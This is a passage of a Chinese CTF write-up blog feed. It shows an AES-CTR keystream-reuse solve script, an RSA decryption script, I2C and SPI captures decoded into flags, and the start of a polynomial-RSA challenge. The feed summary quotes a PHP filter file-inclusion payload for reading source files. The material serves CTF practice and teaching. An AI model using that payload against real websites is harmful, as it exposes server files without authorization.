class="line"><span class="symbol">a2:</span><span class="number">0xbed</span></span><br><span class="line"><span class="symbol">a3:</span><span class="number">0x9c7</span></span><br><span class="line"><span class="symbol">a4:</span><span class="number">0xa00</span></span><br></pre></td></tr></table></figure></p><h3 id="question-1"><a href="#question-1" class="headerlink" title="question 1"></a>question 1</h3><blockquote><p>26364809  Part1 26366033 26366621</p><ol><li>看到这三个数都是素数，猜想part1也可能是素数(并且相隔37)。google到如下的素数表<br><img src="https://uploader.shimo.im/f/XF5u0tmf5ykNuqMJ.png!thumbnail" alt=""><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">part1=<span class="number">26365399</span></span><br><span class="line">hex(<span class="number">26365399</span>)=<span class="number">0x1924dd7</span></span><br></pre></td></tr></table></figure></li></ol></blockquote><p>hex</p><h3 id="question-2"><a href="#question-2" class="headerlink" title="question 2"></a>question 2</h3><ol><li>没什么好说的，极限和定积分<br><a href="https://zh.numberempire.com/definiteintegralcalculator.php" target="_blank" rel="noopener">在线求解</a><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">part2=(<span class="number">1</span>+<span class="number">91</span>+<span class="number">7</span>+<span class="number">1</span>)*<span class="number">77</span>=<span class="number">7700</span></span><br><span class="line">hex(<span class="number">7700</span>)=<span class="number">0x1e14</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="question-3"><a href="#question-3" class="headerlink" title="question 3"></a>question 3</h3><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190422145032.png?raw=true" alt=""></p><blockquote><p>part3=0x48d0</p></blockquote><h3 id="question-4"><a href="#question-4" class="headerlink" title="question 4"></a>question 4</h3><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190422145340.png?raw=true" alt=""></p><blockquote><p>part4=hex(336pi*120/pi=40320)=0x9d806</p></blockquote><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><ol><li>本题个是aes-ctr加密，但在同一次通信中其中的key和计数器不变,所以明文异或的密钥不会变.</li><li>所以需要在通信过程可以通过输入不同的填充获得密钥</li><li>AES_CTR 就是对明文分组做异或</li><li>输入：11111111111111111111111111111111111111111111111111111 (48+5 = 53个重复),得到密文分为6组分别为part1~part6</li><li>输入：11111 (5个重复),得到密文分为6组分别为No.1~No.3</li><li>代入即可求解<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">s1=[<span class="string">"part1"</span>,<span class="string">"part2"</span>,<span class="string">"part3"</span>,<span class="string">"part4"</span>,<span class="string">"part5"</span>,<span class="string">"part6"</span>]</span><br><span class="line">s2=[<span class="string">"NO.1"</span>,<span class="string">"NO.2"</span>,<span class="string">"NO.3"</span>]</span><br><span class="line"><span class="attribute">ming</span>=<span class="string">"11111111111111111111111111111111111111111111111111111"</span></span><br><span class="line"><span class="attribute">minghex</span>=ming.encode("hex")</span><br><span class="line"><span class="builtin-name">print</span> minghex</span><br><span class="line"><span class="attribute">key1</span>=int(s1[0],16)^int(minghex,16)</span><br><span class="line"><span class="attribute">key2</span>=int(s1[1],16)^int(minghex,16)</span><br><span class="line"><span class="attribute">key3</span>=int(s1[2],16)^int(minghex,16)</span><br><span class="line"><span class="attribute">minghex0</span>=int(s2[0],16)^key1</span><br><span class="line"><span class="attribute">minghex1</span>=int(s2[1],16)^key2</span><br><span class="line"><span class="attribute">minghex2</span>=int(s2[2],16)^key3</span><br><span class="line"><span class="builtin-name">print</span> len(hex(key1))</span><br><span class="line"><span class="builtin-name">print</span> len(hex(key2))</span><br><span class="line"><span class="builtin-name">print</span> len(hex(key3))</span><br><span class="line"><span class="builtin-name">print</span> hex(minghex0)</span><br><span class="line"><span class="builtin-name">print</span> hex(minghex1)</span><br><span class="line"><span class="builtin-name">print</span> hex(minghex2)</span><br><span class="line"><span class="builtin-name">print</span> hex(minghex0)[2:-1].decode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="builtin-name">print</span> hex(minghex1)[2:-1].decode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="builtin-name">print</span> hex(minghex2)[2:-1].decode(<span class="string">"hex"</span>)</span><br></pre></td></tr></table></figure></li></ol><h2 id="Asymmetric"><a href="#Asymmetric" class="headerlink" title="Asymmetric"></a>Asymmetric</h2><ul><li>没什么好讲的，就一RSA的基本解法<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">N=754600786340927688096652328072061561501667781193760284816393637647032362908189628005150802929636396969230958922073774180726205402897453096041624408154494621307262657492560975357997726055874834308239749992507552325614973631556754707427580134609221878324704469965450463088892083264951442562525825243127575048386573246756312509362222667015490013299327398464802116909245529065994770788125182846841016932803939806558559335886481214931253578226314057242462834149031625361286317307273138514126289052003214703248070256059405676891634792175775697355408418965738663732479622148276007308404691800186837579126431484536836513358124181380166971922188839934522356902295160649189850427580493328509329115798694580347461641487270793993129066433242544366683131231903590153844590595882428219010673818765995719694470668924781499987923250883546686344997580959954960334567874040563037167422839228466141912000421309282727363913908613116739074234989825489075148091144771967111113068647060175231126374070143480727000247378471525286907200601035581143391602569836131345909055708005758380081303860198696570649330092070410465978479841469533490522594827330661914537170063053059393550673731195548189192109328158876774080143171304333338291909598353550442855717204721</span><br><span class="line"></span><br><span class="line">e=58134567416061346246424950552806959952164141873988197038339318172373514096258823300468791726051378264715940131129676561677588167620420173326653609778206847514019727947838555201787320799426605222230914672691109516799571428125187628867529996213312357571123877040878478311539048041218856094075106182505973331343540958942283689866478426396304208219428741602335233702611371265705949787097256178588070830596507292566654989658768800621743910199053418976671932555647943277486556407963532026611905155927444039372549162858720397597240249353233285982136361681173207583516599418613398071006829129512801831381836656333723750840780538831405624097443916290334296178873601780814920445215584052641885068719189673672829046322594471259980936592601952663772403134088200800288081609498310963150240614179242069838645027877593821748402909503021034768609296854733774416318828225610461884703369969948788082261611019699410587591866516317251057371710851269512597271573573054094547368524415495010346641070440768673619729280827372954003276250541274122907588219152496998450489865181536173702554116251973661212376735405818115479880334020160352217975358655472929210184877839964775337545502851880977049299029101466287659419446724781305689536816523774995178046989696610897508786776845460908137698543091418571263630383061605011820139755322231913029643701770497299157169690586232187419462594477116374977216427311975598620616618808494138669546120288334682865354702356192972496556372279363023366842805886601834278434406709218165445335977049796015123909789363819484954615665668979</span><br><span class="line"></span><br><span class="line">phi=165740755190793304655854506052794072378181046252118367693457385632818329041540419488625472007710062128632942664366383551452498541560538744582922713808611320176770401587674618121885719953831122487280978418110380597358747915420928053860076414097300832349400288770613227105348835005596365488460445438176193451867**4-165740755190793304655854506052794072378181046252118367693457385632818329041540419488625472007710062128632942664366383551452498541560538744582922713808611320176770401587674618121885719953831122487280978418110380597358747915420928053860076414097300832349400288770613227105348835005596365488460445438176193451867**3</span><br><span class="line"></span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"></span><br><span class="line">c=397664589731174185244807196969081295636743791347632992634877550171968202027583158122965358524605148382084087083055292775614950985582170471137600161892882032418551412966830769759927895880547815633951497722234770712306297076112879370771232002533504544337602525761984751743331880661186125346775270009628518533444304138475743540761869803954394981015216901027389649277312518044879870118578221153501921121767735420588646590238714924432821796920521634258142397614044689209502427096357648434975129259602082825127577076206003397304427079424477492861403400315663250325072548968845681025152851701569515687341859140204177488152275522562157702438579218042125793735027062228793066059121344460139665832155539640935735205492779952978907816559262061499244528361109871020021430760020031419798283808270133071565808900320433503202909269829912391264709602543303699123003147709062800113790217663557468058878220523200876377904766404202224175582491708673210826668402867922460431914279888880230599188839367957343839752438896262332473564984706656652754054197747324605372489970688044871961691577273950534597267097030840338786892644592482975063818909397183558108598420167691316258539257369739732052074157931998072754050437812781241004016365131849522113541913181</span><br><span class="line"></span><br><span class="line">print hex(pow(c,d,N))[2:].decode('hex')</span><br></pre></td></tr></table></figure></li></ul><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="saleae"><a href="#saleae" class="headerlink" title="saleae"></a>saleae</h2><ul><li>需要安装saleae logic工具然后导入文件<br><img src="https://uploader.shimo.im/f/6eHQwwUon9UGxPod.png!thumbnail" alt=""></li></ul><ol><li><p>一上一下为0，同上为1,和异或的思想一样。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">01100110</span></span><br><span class="line"><span class="number">01101100</span></span><br><span class="line"><span class="number">01100001</span> </span><br><span class="line"><span class="number">01100111</span></span><br><span class="line"><span class="number">01111011</span></span><br><span class="line"><span class="number">00110001</span></span><br><span class="line"><span class="number">00110010</span></span><br><span class="line"><span class="number">00110000</span></span><br><span class="line"><span class="number">00110111</span></span><br><span class="line"><span class="number">00110001</span></span><br><span class="line"><span class="number">00110011</span></span><br><span class="line"><span class="number">00111001</span></span><br><span class="line"><span class="number">00110111</span></span><br><span class="line"><span class="number">00101101</span></span><br><span class="line"><span class="number">00110001</span></span><br><span class="line"><span class="number">00111001</span></span><br><span class="line"><span class="number">01100100</span></span><br><span class="line"><span class="number">00110001</span></span><br><span class="line"><span class="number">00101101</span></span><br><span class="line"><span class="number">00110100</span></span><br><span class="line"><span class="number">00111000</span></span><br><span class="line"><span class="number">01100101</span></span><br><span class="line"><span class="number">00110110</span></span><br><span class="line"><span class="number">00101101</span></span><br><span class="line"><span class="number">01100010</span></span><br><span class="line"><span class="number">01100101</span></span><br><span class="line"><span class="number">00111000</span></span><br><span class="line"><span class="number">01100011</span></span><br><span class="line"><span class="number">00101101</span></span><br><span class="line"><span class="number">00110111</span></span><br><span class="line"><span class="number">00111000</span></span><br><span class="line"><span class="number">00110100</span></span><br><span class="line"><span class="number">01100010</span></span><br><span class="line"><span class="number">00111000</span></span><br><span class="line"><span class="number">00111001</span></span><br><span class="line"><span class="number">01100001</span></span><br><span class="line"><span class="number">00111001</span></span><br><span class="line"><span class="number">00110101</span></span><br><span class="line"><span class="number">01100101</span></span><br><span class="line"><span class="number">00110000</span></span><br><span class="line"><span class="number">00110111</span></span><br><span class="line"><span class="number">01111101</span></span><br></pre></td></tr></table></figure></li><li><p>二进制转字符即可</p></li></ol><h2 id="24C"><a href="#24C" class="headerlink" title="24C"></a>24C</h2><ol><li>saleae logic导入文件<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190422150328.png?raw=true" alt=""></li><li>选择I2C协议导出<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">Time [s],Packet ID,Address,Data,Read/Write,ACK/NAK</span><br><span class="line"><span class="number">0.843872000000000</span>,<span class="number">0</span>,'<span class="number">160</span>',' ',Write,ACK</span><br><span class="line"><span class="number">0.844038500000000</span>,<span class="number">0</span>,'<span class="number">160</span>',f,Write,ACK</span><br><span class="line"><span class="number">0.844205000000000</span>,<span class="number">0</span>,'<span class="number">160</span>',<span class="number">1</span>,Write,ACK</span><br><span class="line"><span class="number">0.844371000000000</span>,<span class="number">0</span>,'<span class="number">160</span>',<span class="number">6</span>,Write,ACK</span><br><span class="line"><span class="number">0.844537500000000</span>,<span class="number">0</span>,'<span class="number">160</span>',<span class="number">3</span>,Write,ACK</span><br><span class="line"><span class="number">0.844704000000000</span>,<span class="number">0</span>,'<span class="number">160</span>',b,Write,ACK</span><br><span class="line"><span class="number">0.844870500000000</span>,<span class="number">0</span>,'<span class="number">160</span>',d,Write,ACK</span><br><span class="line"><span class="number">0.845036500000000</span>,<span class="number">0</span>,'<span class="number">160</span>',f,Write,ACK</span><br><span class="line"><span class="number">0.845203000000000</span>,<span class="number">0</span>,'<span class="number">160</span>',<span class="number">4</span>,Write,ACK</span><br><span class="line"><span class="number">0.845369500000000</span>,<span class="number">0</span>,'<span class="number">160</span>',e,Write,ACK</span><br><span class="line"><span class="number">0.845536000000000</span>,<span class="number">0</span>,'<span class="number">160</span>',&#125;,Write,ACK</span><br><span class="line"><span class="number">0.845702500000000</span>,<span class="number">0</span>,'<span class="number">160</span>','<span class="number">0</span>',Write,ACK</span><br><span class="line"><span class="number">0.945962500000000</span>,<span class="number">1</span>,'<span class="number">160</span>','<span class="number">0</span>',Write,ACK</span><br><span class="line"><span class="number">0.946318000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',f,Read,ACK</span><br><span class="line"><span class="number">0.946481500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',l,Read,ACK</span><br><span class="line"><span class="number">0.946645000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',a,Read,ACK</span><br><span class="line"><span class="number">0.946808500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',g,Read,ACK</span><br><span class="line"><span class="number">0.946972000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',&#123;,Read,ACK</span><br><span class="line"><span class="number">0.947135500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',c,Read,ACK</span><br><span class="line"><span class="number">0.947299500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">4</span>,Read,ACK</span><br><span class="line"><span class="number">0.947463000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">6</span>,Read,ACK</span><br><span class="line"><span class="number">0.947626500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',d,Read,ACK</span><br><span class="line"><span class="number">0.947790000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">9</span>,Read,ACK</span><br><span class="line"><span class="number">0.947953500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',e,Read,ACK</span><br><span class="line"><span class="number">0.948117500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">1</span>,Read,ACK</span><br><span class="line"><span class="number">0.948281000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">0</span>,Read,ACK</span><br><span class="line"><span class="number">0.948444500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',-,Read,ACK</span><br><span class="line"><span class="number">0.948608000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',e,Read,ACK</span><br><span class="line"><span class="number">0.948771500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">9</span>,Read,ACK</span><br><span class="line"><span class="number">0.948935500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',b,Read,ACK</span><br><span class="line"><span class="number">0.949099000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">5</span>,Read,ACK</span><br><span class="line"><span class="number">0.949262500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',-,Read,ACK</span><br><span class="line"><span class="number">0.949426000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">4</span>,Read,ACK</span><br><span class="line"><span class="number">0.949589500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',d,Read,ACK</span><br><span class="line"><span class="number">0.949753000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">9</span>,Read,ACK</span><br><span class="line"><span class="number">0.949917000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">0</span>,Read,ACK</span><br><span class="line"><span class="number">0.950080500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',-,Read,ACK</span><br><span class="line"><span class="number">0.950244000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',a,Read,ACK</span><br><span class="line"><span class="number">0.950407500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">8</span>,Read,ACK</span><br><span class="line"><span class="number">0.950571000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">8</span>,Read,ACK</span><br><span class="line"><span class="number">0.950734500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">3</span>,Read,ACK</span><br><span class="line"><span class="number">0.950898000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',-,Read,ACK</span><br><span class="line"><span class="number">0.951061500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">4</span>,Read,ACK</span><br><span class="line"><span class="number">0.951225000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">1</span>,Read,ACK</span><br><span class="line"><span class="number">0.951388500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',c,Read,NAK</span><br><span class="line"><span class="number">5.946647000000000</span>,<span class="number">3</span>,'<span class="number">160</span>',\t,Write,ACK</span><br><span class="line"><span class="number">5.946813500000000</span>,<span class="number">3</span>,'<span class="number">160</span>',a,Write,ACK</span><br><span class="line"><span class="number">5.946980000000000</span>,<span class="number">3</span>,'<span class="number">160</span>',c,Write,ACK</span><br></pre></td></tr></table></figure></li></ol><h2 id="usbasp"><a href="#usbasp" class="headerlink" title="usbasp"></a>usbasp</h2><ol><li>analyzer 选SPI<br><img src="https://uploader.shimo.im/f/Rsc7z3OMEnE120JA.png!thumbnail" alt=""></li><li>导出<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Time [s],Packet ID,MOSI,MISO</span><br><span class="line"><span class="number">1.474939400000000</span>,,f,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.474945500000000</span>,,l,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.474951600000000</span>,,a,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.474957700000000</span>,,g,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.474963800000000</span>,,&#123;,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.474969900000000</span>,,<span class="number">8</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.474976000000000</span>,,<span class="number">5</span>,<span class="number">5</span></span><br><span class="line"><span class="number">1.474982100000000</span>,,b,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.474988300000000</span>,,<span class="number">0</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.474994400000000</span>,,<span class="number">8</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475000500000000</span>,,<span class="number">4</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475006600000000</span>,,c,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475012700000000</span>,,<span class="number">6</span>,<span class="number">6</span></span><br><span class="line"><span class="number">1.475018800000000</span>,,-,-</span><br><span class="line"><span class="number">1.475024900000000</span>,,<span class="number">4</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475031100000000</span>,,<span class="number">2</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475037200000000</span>,,e,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475043300000000</span>,,<span class="number">6</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475049400000000</span>,,-,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475055500000000</span>,,<span class="number">4</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475061600000000</span>,,<span class="number">9</span>,<span class="number">9</span></span><br><span class="line"><span class="number">1.475067700000000</span>,,<span class="number">5</span>,'<span class="number">5</span>'</span><br><span class="line"><span class="number">1.475073900000000</span>,,c,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475080000000000</span>,,-,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475086100000000</span>,,<span class="number">8</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475092200000000</span>,,<span class="number">7</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475098300000000</span>,,b,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475104400000000</span>,,<span class="number">4</span>,<span class="number">0</span></span><br><span class="line"><span class="number">1.475110500000000</span>,,-,-</span><br><span class="line"><span class="number">1.475116600000000</span>,,<span class="number">4</span>,'<span class="number">4</span>'</span><br><span class="line"><span class="number">1.475122800000000</span>,,<span class="number">6</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475128900000000</span>,,d,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475135000000000</span>,,f,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475141100000000</span>,,b,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475147200000000</span>,,<span class="number">1</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475153300000000</span>,,d,d</span><br><span class="line"><span class="number">1.475159400000000</span>,,f,f</span><br><span class="line"><span class="number">1.475165500000000</span>,,<span class="number">5</span>,'<span class="number">1</span>'</span><br><span class="line"><span class="number">1.475171700000000</span>,,<span class="number">8</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475177800000000</span>,,a,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475183900000000</span>,,<span class="number">0</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475190000000000</span>,,&#125;,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475196100000000</span>,,'<span class="number">0</span>','<span class="number">0</span>'</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;JustSoso&quot;&gt;&lt;a href=&quot;#JustSoso&quot; class=&quot;headerlink&quot; title=&quot;JustSoso&quot;&gt;&lt;/a&gt;JustSoso&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;?file=php://filter/read=convert.base64-encode/resource=hint.php&lt;/p&gt;
    
    </summary>
    
      <category term="CTFWP" scheme="https://cy9nusg4rd3n.github.io/categories/CTFWP/"/>
    
    
      <category term="Misc" scheme="https://cy9nusg4rd3n.github.io/tags/Misc/"/>
    
      <category term="Web" scheme="https://cy9nusg4rd3n.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>RSA in polynomial</title>
    <link href="https://cy9nusg4rd3n.github.io/2019/04/16/RSA-in-polynomial/"/>
    <id>https://cy9nusg4rd3n.github.io/2019/04/16/RSA-in-polynomial/</id>
    <published>2019-04-16T14:25:38.000Z</published>
    <updated>2020-04-18T03:25:44.707Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="RSA-in-polynomial"><a href="#RSA-in-polynomial" class="headerlink" title="RSA in polynomial"></a>RSA in polynomial</h1><ol><li>题目给了三个文件如下<a id="more"></a></li></ol><ul><li><p>pubkey.py</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from sage.all import GF, PolynomialRing</span><br><span class="line"></span><br><span class="line">P=PolynomialRing(GF(<span class="number">2</span>),'x')</span><br><span class="line">e = <span class="number">31337</span></span><br><span class="line">n = P('x^<span class="number">2048</span> + x^<span class="number">2046</span> + x^<span class="number">2043</span> + x^<span class="number">2040</span> + x^<span class="number">2036</span> + x^<span class="number">2035</span> + x^<span class="number">2034</span> + x^<span class="number">2033</span> + ... + x^<span class="number">7</span> + x^<span class="number">3</span> + <span class="number">1</span></span><br><span class="line"># n很多这里就列几个表示一下</span><br></pre></td></tr></table></figure></li><li><p>rsa.sage</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">from</span> pubkey import P, n, e</span><br><span class="line"><span class="built_in">from</span> secret import flag</span><br><span class="line"><span class="built_in">from</span> os import urandom</span><br><span class="line"></span><br><span class="line">R.&lt;<span class="keyword">a</span>&gt; = GF(<span class="number">2</span>^<span class="number">2049</span>)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">encrypt</span>(m):</span><br><span class="line">    <span class="built_in">global</span> n</span><br><span class="line">    assert <span class="built_in">len</span>(m) &lt;= <span class="number">256</span></span><br><span class="line">    m_int = Integer(m.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">    m_poly = P(R.fetch_int(m_int))</span><br><span class="line">    c_poly = pow(m_poly, e, n)</span><br><span class="line">    c_int = R(c_poly).integer_representation()</span><br><span class="line">    c = <span class="built_in">format</span>(c_int, <span class="string">'0256x'</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="literal">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    ptext = flag + os.urandom(<span class="number">256</span>-<span class="built_in">len</span>(flag))</span><br><span class="line">    ctext = <span class="built_in">encrypt</span>(ptext)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'flag.enc'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.<span class="built_in">write</span>(ctext)</span><br></pre></td></tr></table></figure></li><li><p>flag.enc</p><blockquote><p>这个就不多说了，乱码，最终要解的</p></blockquote></li></ul><ol 